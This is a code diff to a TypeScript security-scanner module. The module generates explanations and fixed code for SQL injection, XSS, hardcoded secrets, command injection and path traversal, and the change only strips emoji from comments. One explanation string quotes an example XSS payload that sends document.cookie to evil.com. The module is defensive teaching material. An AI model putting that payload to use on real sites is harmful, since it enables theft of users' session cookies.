@@ -136,7 +136,7 @@ function buildSqlFix(code: string, varName: string, isCSharp: boolean, isPython:
     // Replace concatenation with @param
     const paramSql = baseSql.replace(/=\s*["']?\s*$/, `=@${col}`);
     return (
-      `// ✅ Fixed — C# parameterized query\n` +
+      `// Fixed — C# parameterized query\n` +
       `string ${queryVar} = "${paramSql}";\n` +
       `using var cmd = new SqlCommand(${queryVar}, connection);\n` +
       `cmd.Parameters.AddWithValue("@${col}", ${varName});`
@@ -147,7 +147,7 @@ function buildSqlFix(code: string, varName: string, isCSharp: boolean, isPython:
     const whereMatch = code.match(/WHERE\s+(\w+)\s*=/i);
     const col = whereMatch ? whereMatch[1] : 'id';
     return (
-      `# ✅ Fixed — Python parameterized query\n` +
+      `# Fixed — Python parameterized query\n` +
       `cursor.execute(\n` +
       `    "SELECT * FROM table WHERE ${col} = %s",\n` +
       `    (${varName},)  # passed as a parameter, not concatenated\n` +
@@ -159,7 +159,7 @@ function buildSqlFix(code: string, varName: string, isCSharp: boolean, isPython:
     const whereMatch = code.match(/WHERE\s+(\w+)\s*=/i);
     const col = whereMatch ? whereMatch[1] : 'id';
     return (
-      `// ✅ Fixed — Node.js parameterized query\n` +
+      `// Fixed — Node.js parameterized query\n` +
       `const ${queryVar} = "SELECT * FROM table WHERE ${col} = ?";\n` +
       `const [rows] = await connection.execute(${queryVar}, [${varName}]);`
     );
@@ -167,7 +167,7 @@ function buildSqlFix(code: string, varName: string, isCSharp: boolean, isPython:
 
   // Generic fallback
   return (
-    `-- ✅ Use a parameterized query\n` +
+    `-- Use a parameterized query\n` +
     `-- Pass ${varName} as a bound parameter, not by concatenation\n` +
     `PREPARE stmt FROM 'SELECT * FROM table WHERE id = ?';\n` +
     `EXECUTE stmt USING @${varName};`
@@ -204,10 +204,10 @@ function explainXss(finding: SecurityFinding): ContextualExplanation {
       `The browser will execute the \`onerror\` JavaScript, giving an attacker ` +
       `the ability to steal cookies, redirect users, or deface the page.`;
     fixedCode =
-      `// ❌ Vulnerable\n// element.innerHTML = ${inputVar};\n\n` +
-      `// ✅ Option 1 — plain text only (no HTML)\n` +
+      `// Vulnerable\n// element.innerHTML = ${inputVar};\n\n` +
+      `// Option 1 — plain text only (no HTML)\n` +
       `element.textContent = ${inputVar};\n\n` +
-      `// ✅ Option 2 — sanitize if HTML is needed\n` +
+      `// Option 2 — sanitize if HTML is needed\n` +
       `import DOMPurify from 'dompurify';\n` +
       `element.innerHTML = DOMPurify.sanitize(${inputVar});`;
     fixExplanation =
@@ -218,25 +218,25 @@ function explainXss(finding: SecurityFinding): ContextualExplanation {
       `If \`${inputVar}\` contains:\n  fetch('https://evil.com/?c='+document.cookie)\n` +
       `eval() will execute it directly, sending the user's cookies to an attacker's server.`;
     fixedCode =
-      `// ❌ Never use eval() with external input\n// eval(${inputVar});\n\n` +
-      `// ✅ Use JSON.parse() for data\n` +
+      `// Never use eval() with external input\n// eval(${inputVar});\n\n` +
+      `// Use JSON.parse() for data\n` +
       `const data = JSON.parse(${inputVar});\n\n` +
-      `// ✅ Or rethink the architecture to avoid eval entirely`;
+      `// Or rethink the architecture to avoid eval entirely`;
     fixExplanation = `JSON.parse() safely parses JSON data without executing arbitrary code.`;
   } else if (isDangerouslySet) {
     attack =
       `React's \`dangerouslySetInnerHTML\` bypasses React's XSS protection. ` +
       `If the HTML value contains \`<script>\` or event handlers, they will execute.`;
     fixedCode =
-      `// ❌ Dangerous\n// dangerouslySetInnerHTML={{ __html: ${inputVar} }}\n\n` +
-      `// ✅ Sanitize first\nimport DOMPurify from 'dompurify';\n` +
+      `// Dangerous\n// dangerouslySetInnerHTML={{ __html: ${inputVar} }}\n\n` +
+      `// Sanitize first\nimport DOMPurify from 'dompurify';\n` +
       `<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(${inputVar}) }} />`;
     fixExplanation = `DOMPurify removes all dangerous tags and event handlers before the HTML is rendered.`;
   } else {
     attack = `The value of \`${inputVar}\` is inserted into the page without sanitization, ` +
              `allowing an attacker to inject executable JavaScript.`;
     fixedCode =
-      `// ✅ Always sanitize user input before inserting into the DOM\n` +
+      `// Always sanitize user input before inserting into the DOM\n` +
       `const safe = DOMPurify.sanitize(${inputVar});\n` +
       `element.innerHTML = safe;`;
     fixExplanation = `Sanitize HTML using DOMPurify before any DOM insertion.`;
@@ -288,11 +288,11 @@ function explainHardcodedSecret(finding: SecurityFinding): ContextualExplanation
       `and notify attackers within minutes of a public push.`,
     vulnerableCode: code,
     fixedCode:
-      `// ❌ Never hardcode secrets\n// ${code.trim()}\n\n` +
-      `// ✅ Use an environment variable\nconst ${varName} = process.env.${varName.toUpperCase()};\n\n` +
-      `// ✅ In your .env file (add .env to .gitignore!):\n` +
+      `// Never hardcode secrets\n// ${code.trim()}\n\n` +
+      `// Use an environment variable\nconst ${varName} = process.env.${varName.toUpperCase()};\n\n` +
+      `// In your .env file (add .env to .gitignore!):\n` +
       `// ${varName.toUpperCase()}=<your-actual-secret>\n\n` +
-      `// ✅ For production: use a secrets manager\n` +
+      `// For production: use a secrets manager\n` +
       `// AWS Secrets Manager / Azure Key Vault / HashiCorp Vault`,
     fixExplanation:
       `Environment variables are never committed to source control. ` +
@@ -320,8 +320,8 @@ function explainCommandInjection(finding: SecurityFinding): ContextualExplanatio
       `returning the server's password file. Full system compromise is possible.`,
     vulnerableCode: code,
     fixedCode:
-      `// ❌ Vulnerable — string interpolation\n// exec("ping " + ${varName});\n\n` +
-      `// ✅ Fixed — pass args as array, no shell\n` +
+      `// Vulnerable — string interpolation\n// exec("ping " + ${varName});\n\n` +
+      `// Fixed — pass args as array, no shell\n` +
       `const { execFile } = require('child_process');\n` +
       `execFile('ping', [${varName}], (err, stdout) => {\n` +
       `  // ${varName} is now a literal argument, shell injection impossible\n` +
@@ -352,8 +352,8 @@ function explainPathTraversal(finding: SecurityFinding): ContextualExplanation {
     vulnerableCode: code,
     fixedCode:
       `const path = require('path');\n\n` +
-      `// ❌ Vulnerable\n// fs.readFileSync(baseDir + ${varName});\n\n` +
-      `// ✅ Fixed — validate the resolved path\n` +
+      `// Vulnerable\n// fs.readFileSync(baseDir + ${varName});\n\n` +
+      `// Fixed — validate the resolved path\n` +
       `const baseDir = path.resolve('./uploads');\n` +
       `const resolved = path.resolve(baseDir, ${varName});\n\n` +
       `if (!resolved.startsWith(baseDir + path.sep)) {\n` +
